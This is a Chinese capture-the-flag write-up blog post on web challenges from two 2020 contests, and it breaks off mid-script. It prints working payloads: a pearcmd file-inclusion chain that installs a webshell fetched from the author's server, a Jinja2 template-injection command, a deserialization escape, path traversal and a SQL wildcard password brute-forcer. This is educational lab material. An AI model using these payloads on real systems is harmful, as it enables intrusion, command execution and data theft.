@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="是好玩的比赛的 WriteUp！ 巅峰极客 2020MeowWorld首先看 hint register_argc_argv ，打开环境之后发现在 index.php 有一个简单的文件包含。用 PHP 伪协议读取一圈文件，发现如下内容。 1234&lt;?php 	$f &#x3D; $_GET[&amp;#x27;f&amp;#x27;] ?? &quot;home&quot;;	include(&quot;&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="巅峰极客 2020 &amp; CTF Show 月饼杯">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="是好玩的比赛的 WriteUp！ 巅峰极客 2020MeowWorld首先看 hint register_argc_argv ，打开环境之后发现在 index.php 有一个简单的文件包含。用 PHP 伪协议读取一圈文件，发现如下内容。 1234&lt;?php 	$f &#x3D; $_GET[&amp;#x27;f&amp;#x27;] ?? &quot;home&quot;;	include(&quot;&amp;#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156090448.1f378a59ca61b45569e160e6e64d5492359d9222.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156174944.e118a27a9dfb1fed2e8882e9c237c5eff3dbd09d.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156234379.e7f79b2646c79d2988d11b9b3c85d610ad788690.png">
+<meta property="article:published_time" content="2020-09-28T09:35:11.000Z">
+<meta property="article:modified_time" content="2021-04-28T07:48:38.194Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156090448.1f378a59ca61b45569e160e6e64d5492359d9222.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>巅峰极客 2020 &amp; CTF Show 月饼杯</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/7ba1ed56.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/9b2fbf24.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/9b2fbf24.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&text=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&is_video=false&description=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=巅峰极客 2020 &amp; CTF Show 月饼杯&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&name=巅峰极客 2020 &amp; CTF Show 月饼杯&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&t=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2020"><span class="toc-number">1.</span> <span class="toc-text">巅峰极客 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MeowWorld"><span class="toc-number">1.1.</span> <span class="toc-text">MeowWorld</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyflask"><span class="toc-number">1.2.</span> <span class="toc-text">babyflask</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Show-%E6%9C%88%E9%A5%BC%E6%9D%AF"><span class="toc-number">2.</span> <span class="toc-text">CTF Show 月饼杯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A4%E5%A4%9C%E5%9C%86"><span class="toc-number">2.1.</span> <span class="toc-text">此夜圆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%85%E4%BA%BA%E5%BF%83"><span class="toc-number">2.2.</span> <span class="toc-text">故人心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F"><span class="toc-number">2.3.</span> <span class="toc-text">莫负婵娟</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        巅峰极客 2020 &amp; CTF Show 月饼杯
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-28T09:35:11.000Z" itemprop="datePublished">2020-09-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>是好玩的比赛的 WriteUp！</p>
+<h2 id="巅峰极客-2020"><a href="#巅峰极客-2020" class="headerlink" title="巅峰极客 2020"></a>巅峰极客 2020</h2><h3 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h3><p>首先看 hint <code>register_argc_argv</code> ，打开环境之后发现在 <code>index.php</code> 有一个简单的文件包含。用 PHP 伪协议读取一圈文件，发现如下内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>] ?? <span class="string">&quot;home&quot;</span>;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;<span class="subst">&#123;$f&#125;</span>.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据 hint 可知，<code>argc</code> 和 <code>argv</code> 两个参数可以指定，参考 <a target="_blank" rel="noopener" href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/">这篇文章</a> 可以知道接下来需要做什么。既然要用 <code>pearcmd</code>，当然是首先读一手源码，于是利用上面的构造读取出 <code>pearcmd</code> 的源码，找到关键部分如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safely read the $argv PHP array across different PHP configurations.</span></span><br><span class="line"><span class="comment">     * Will take care on register_globals and register_argc_argv ini directives</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed the $argv PHP array or PEAR error if not registered</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现 <code>argv</code> 会被当成参数返回，于是构造 <code>?f=pearcmd&amp;argv=2+list</code>，得到回显如下，于是按照文章上的指引，准备一个包。</p>
+<p>首先下载 <a target="_blank" rel="noopener" href="http://download.pear.php.net/package/Archive_Tar-1.4.0.tgz">这个包</a>，然后在 <code>Archive_Tar-1.4.0/Archive</code> 下增加一个一句话木马的 PHP 文件 <code>zit.php</code>。然后将 <code>./package.xml</code> 文件中的 <code>&lt;content&gt;</code> 节点对应修改如下。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contents</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dir</span> <span class="attr">name</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;89b230679f31da6f8dbdea25095f4ca9&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Archive/Tar.php&quot;</span> <span class="attr">role</span>=<span class="string">&quot;php&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;7cc168393304c0c9c0de96d5e5e318e0&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Archive/zit.php&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;2fb90f0be7089a45c09a0d1182792419&quot;</span> <span class="attr">name</span>=<span class="string">&quot;docs/Archive_Tar.txt&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dir</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">contents</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将整个包按原格式压缩还原为 <code>tar.gz</code>，然后上传至服务器获取支链 <code>https://v2.api.lemonprefect.cn/static/zips/zit.tar.gz</code>。接下来构造 <code>?f=pearcmd&amp;argv=list+install+--installroot+/tmp/+https://v2.api.lemonprefect.cn/static/zips/zit.tar.gz</code>，得到包安装成功的回显 <code>install ok: channel://pear.php.net/Archive_Tar-1.4.0</code>。</p>
+<p>此时只需要找到 <code>zit.php</code> 的路由即可，随便输入一个之后看到报错中的关键信息 <code>include_path=&#39;.:/usr/local/lib/php&#39;</code>，于是拼合包的路径之后访问 <code>/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/zit</code> 拿到 shell 的路由。使用蚁剑连接上去，可以看到 <code>/readflag</code>。</p>
+<p>执行 <code>/readflag</code> 时发现需要计算算术题，但是默认的虚拟终端没有交互，于是使用 perl 脚本完成这一步。在 <code>/tmp/tmp</code> 目录下写入脚本并执行即可得 flag。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">&#x27;/readflag&#x27;</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;open3() failed $!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">substr</span>($r,<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br></pre></td></tr></table></figure>
+<div align=center>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156090448.1f378a59ca61b45569e160e6e64d5492359d9222.png" alt="perl 脚本执行得到 flag"></p>
+</div>
+
+<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>看界面，老 Whoami 了。直接看请求，发现是 SSTI，一套标准拳打出，拿到 flag。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../loged?name=&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<div align=center>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156174944.e118a27a9dfb1fed2e8882e9c237c5eff3dbd09d.png" alt="回显 flag"></p>
+</div>
+
+<h2 id="CTF-Show-月饼杯"><a href="#CTF-Show-月饼杯" class="headerlink" title="CTF Show 月饼杯"></a>CTF Show 月饼杯</h2><h3 id="此夜圆"><a href="#此夜圆" class="headerlink" title="此夜圆"></a>此夜圆</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>, <span class="string">&#x27;Firebaskyup&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此处造成了简单的反序列化逃逸，<code>Firebasky</code> 被替换成 <code>Firebaskyup</code>，字符多出两个。需要构造的反序列化字符串可以写成这样。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;s:(这里是长度):<span class="string">&quot;(这里是用户名)&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;yu22x&quot;</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>总共填充了 30 个字符 <code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</code>，因此需要 15 次替换才能将这 30 个字符变成后面的反序列化内容。<br>于是构造出这样的 payload.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="故人心"><a href="#故人心" class="headerlink" title="故人心"></a>故人心</h3><p><strong>level 1</strong><br>使用科学计数法表达一个极小的小数，采用 <code>1e-199</code>。<br><strong>level 2</strong><br>访问 <code>.../robots.txt</code> 可以发现 <code>hinthint.txt</code> 进而找到如下提示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#39;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>
+
+<p>于是写个脚本跑一下 <code>b</code> 和 <code>c</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt;= <span class="number">999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$b</span> = sprintf(<span class="string">&quot;0e%03d&quot;</span>,<span class="variable">$i</span>) . <span class="string">&quot;024452&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span> == hash(<span class="string">&quot;md2&quot;</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;b = &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">9999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$c</span> = sprintf(<span class="string">&quot;0e%04d&quot;</span>,<span class="variable">$i</span>) . <span class="string">&quot;48399&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span> == hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>,<span class="variable">$c</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;c = &quot;</span> . <span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>b = 0e652024452，c = 0e603448399</code>。<br><strong>level 3</strong></p>
+<blockquote>
+<p>php 会把无法解析的协议当成目录</p>
+</blockquote>
+<p>因此，结合目录穿越就能读到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lemon:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="莫负婵娟"><a href="#莫负婵娟" class="headerlink" title="莫负婵娟"></a>莫负婵娟</h3><p>首先看一手页面源码，得到这样的 hint，用户名是 <code>yu22x</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--注意：正式上线请删除注释内容！ --&gt;</span><br><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#39;$username&#39;) and password like binary(&#39;$password&#39;)--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合题目描述的 hint <code>环境变量 +linux字符串截取 + 通配符</code>，尝试一波 SQL 的通配符。</p>
+<div align=center>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156234379.e7f79b2646c79d2988d11b9b3c85d610ad788690.png" alt="快看！是通配符呐呐呐"></p>
+</div>
+
+<p>依照上图的结果构造一波 payload 发现当 <code>password</code> 参数为 <code>6_______________________________</code> 时回显是不一样的，于是写个脚本跑出密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> ASCII_START = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">const</span> ASCII_END = <span class="number">127</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;6&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">31</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$p</span> = sprintf(<span class="string">&quot;%0&quot;</span> . (<span class="number">30</span> - <span class="variable">$i</span>) . <span class="string">&quot;d&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="number">30</span>)&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span> = str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = ASCII_START;<span class="variable">$j</span> 